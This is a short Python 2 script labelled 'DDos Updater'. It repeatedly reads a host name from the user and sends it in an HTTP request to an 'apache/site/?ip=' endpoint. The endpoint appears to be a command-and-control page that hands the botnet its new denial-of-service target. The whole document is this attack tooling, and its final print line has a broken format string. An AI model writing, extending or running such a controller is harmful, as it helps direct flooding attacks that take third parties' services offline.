import time, socket, os, sys, string, urllib2
 
print ("DDos Updater")

while True:
	updatehost = raw_input("send new host to network: ")
	if updatehost != '':
		print updatehost
		urllib2.urlopen('http://apache/site/?ip=' + updatehost)
		print ("http://apache/site/?ip=&s"  %updatehost)
